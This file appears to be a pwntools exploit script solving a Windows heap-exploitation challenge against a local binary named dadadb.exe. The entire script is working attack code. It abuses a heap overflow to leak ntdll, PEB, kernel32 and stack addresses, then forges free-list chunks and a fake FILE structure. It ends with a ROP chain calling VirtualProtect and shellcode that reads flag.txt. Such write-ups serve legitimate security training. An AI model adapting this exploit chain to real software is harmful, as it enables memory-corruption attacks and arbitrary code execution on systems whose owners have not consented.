from pwn import *
import time
import sys


def add(key, size, data):
    proc.sendlineafter(b'>>', b'1')
    proc.sendlineafter(b':', key)
    proc.sendlineafter(b':', f'{size}'.encode())
    proc.sendafter(b':', data)


def view(key):
    proc.sendlineafter(b'>>', b'2')
    proc.sendlineafter(b':', key)
    proc.recvuntil(b'Data:')


def remove(key):
    proc.sendlineafter(b'>>', b'3')
    proc.sendlineafter(b':', key)


def logout():
    proc.sendlineafter(b'>>', b'4')


def login(name, password):
    proc.sendlineafter(b'>>', b'1')
    proc.sendafter(b':', name)
    proc.sendafter(b':', password)


def exploit():
    login(b'orange\n', b'godlike\n')

    #activate LFH
    for i in range(19):
        add(f'LFH_{i}'.encode(), 0x90, b'LFH')

    #fill userblock
    for i in range(0x10):
        add(f'record_{i}'.encode(), 0x90, b'LFH')

    remove(b'record_0')
    add(b'record_1', 0x60, b'A'*0x60)
    view(b'record_1')

    # data + chunk header
    proc.recv(0x60 + 0x10)
    heap_base = u64(proc.recv(8)) & ~0xffff
    size = u64(proc.recv(8))
    next_record = proc.recvuntil(b'\x00')[:-1]
    log.info('leaked size: ' + hex(size))
    log.info(f'next record: {next_record}')
    log.info('heap: ' + hex(heap_base))

    def leak(addr):
        add(b'record_1', 0x60, b'A' * 0x70 + p64(addr))
        view(next_record)
        return u64(proc.recv(8))
    
    lock = heap_base + 0x2c0
    ntdll = leak(lock) - 0x163d10 - 0x1000
    log.info('ntdll: ' + hex(ntdll))

    peb = leak(ntdll + 0x1662e8) - 0x240
    log.info('peb: ' + hex(peb))

    teb = peb + 0x1000
    log.info('teb: ' + hex(teb))

    stack_limit = leak(teb+0x10)
    log.info('stack limit: ' + hex(stack_limit))

    process_parameter = leak(peb + 0x20)
    stdin = leak(process_parameter + 0x20)
    log.info('stdin:' + hex(stdin))

    stdout = leak(process_parameter + 0x28)
    log.info('stdout:' + hex(stdout))

    peb_ldr = leak(peb + 0x18)
    log.info('peb ldr: ' + hex(peb_ldr))

    immol = peb_ldr + 0x10
    log.info('immol: ' + hex(immol))

    ldrdata = leak(immol)
    log.info('ldrdata: ' + hex(ldrdata))

    bin_base = leak(ldrdata + 0x30)
    log.info('bin base: ' + hex(bin_base))

    kernel32 = leak(bin_base + 0x3000) - 0x22680
    log.info('kernel32: ' + hex(kernel32))

    target = bin_base + 0x1b60
    ret_addr = stack_limit + 0x2800
    found = False
    for i in range(0x1000 // 8):
        val_addr = leak(ret_addr)
        print(i, hex(ret_addr), hex(val_addr))
        if val_addr == target:
            print('Found return address')
            found = True
            break
        ret_addr += 8
    assert found

    add(b'A', 0x400, b'AAAA' * 8)
    add(b'A', 0x100, b'AAAA' * 8)
    add(b'B', 0x100, b'BBBB' * 8)
    add(b'C', 0x100, b'CCCC' * 8)
    add(b'D', 0x100, b'DDDD' * 8)
    remove(b'B')
    remove(b'D')
    view(b'A')
    proc.recv(0x100)
    fake_chunk_header = proc.recv(0x10)
    B_flink = u64(proc.recv(8))
    B_blink = u64(proc.recv(8))
    proc.recv(0x100 + 0x110)
    D_flink = u64(proc.recv(8))
    D_blink = u64(proc.recv(8))
    print(hex(B_flink), hex(B_blink))
    print(hex(D_flink), hex(D_blink))
    B_addr = D_blink
    pass_adr = bin_base + 0x5648
    user_adr = bin_base + 0x5620
    add(b'A', 0x100, b'A' * 0x100 + fake_chunk_header + p64(pass_adr + 0x10))
    logout()
    # B->fake2(pass)->fake1(user)
    fake2 = b'phdphd\x00'.ljust(8, b'\x00') + fake_chunk_header[8:]
    fake2 += p64(user_adr + 0x10) + p64(D_blink) #the flink is fake chunk at user buf and blink is B chunk
    #fake2 += p64(B_flink) + p64(D_blink) #the flink is fake chunk at user buf and blink is B chunk
    fake1 = b'ddaa\x00'.ljust(8, b'\x00') + fake_chunk_header[8:]
    fake1 += p64(D_flink) + p64(pass_adr + 0x10) # flink is flink of D and blink is fake chunk at password
    login(fake1, fake2)

    log.info(f"ret addr @ "+ hex(ret_addr))

    _IOBUFFER_USER = 0x80
    _IOALLOCATED = 0x2000
    
    cnt = 0
    _ptr = 0
    _base = ret_addr
    flag = _IOBUFFER_USER | _IOALLOCATED
    fd = 0
    bufsize = 0x200
    obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag)
    obj += p32(fd) + p32(0) + p64(bufsize) +p64(0)
    obj += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2

    #at this point, we pop B chunk and use it here to allocate obj
    add(b'WeGetBChunk', 0x100, obj)
    #now the fake chunk comes into play and skip the header and write the address of B chunk in fp so it indirectly we wrote obj here
    add(b'WeGetPassChunk', 0x100, b'a' * 0x10 + p64(B_addr))

    logout()
    login(b'aaaa', b'aaaa')

    pop_rdx_rcx_r8_r9_r10_r11 = ntdll + 0x8fc30
    shellcode_addr = bin_base + 0x5000

    readfile = kernel32 + 0x22680
    virtualprotect = kernel32 + 0x1b680
    buf = p64(pop_rdx_rcx_r8_r9_r10_r11) + p64(shellcode_addr)
    buf += p64(stdin) + p64(0x100) +p64(shellcode_addr + 0x100) + p64(10) + p64(11) + p64(readfile)
    buf += p64(pop_rdx_rcx_r8_r9_r10_r11) + p64(0x1000) + p64(shellcode_addr)
    buf += p64(0x40) + p64(ret_addr + 0x100 - 8) + p64(0) + p64(11)
    buf += p64(virtualprotect)
    buf += p64(shellcode_addr)
    proc.send(buf.ljust(0x100 - 8) + p64(0x4))

    writefile = kernel32 + 0x22770
    createfile = kernel32 + 0x222f0

    shellcode = f'''
        jmp getflag
    flag:
        pop r11
    createfile:
        mov qword ptr [rsp + 0x30], 0
        mov qword ptr [rsp + 0x28], 0x80
        mov qword ptr [rsp + 0x20], 3
        xor r9, r9
        mov r8, 1
        mov rdx, 0x80000000
        mov rcx, r11
        mov rax, {createfile}
        call rax
    readfile:
        mov qword ptr [rsp + 0x20], 0
        lea r9, [rsp + 0x200]
        mov r8, 0x100
        lea rdx, [rsp + 0x100]
        mov rcx, rax
        mov rax, {readfile}
        call rax
    writefile:
        mov qword ptr [rsp + 0x20], 0
        lea r9, [rsp + 0x200]
        mov r8, 0x100
        lea rdx, [rsp + 0x100]
        mov rcx, {stdout}
        mov rax, {writefile}
        call rax
    loop:
        jmp loop
    getflag:
        call flag
    '''

    no_nop_sc = asm(shellcode).rstrip(b'\x90')
    shellcode = (no_nop_sc + b'flag.txt\x00').ljust(0x100, b'\x90')
    log.info("Final Shellcode : " + shellcode.hex())
    proc.send(shellcode)


if __name__ == '__main__':
    context.arch = 'amd64'
    proc = process(['.\\dadadb.exe'], env={'LD_LIBRARY_PATH': './'})
    input('attach to pid: {}'.format(proc.proc.pid))
    exploit()
    proc.interactive()
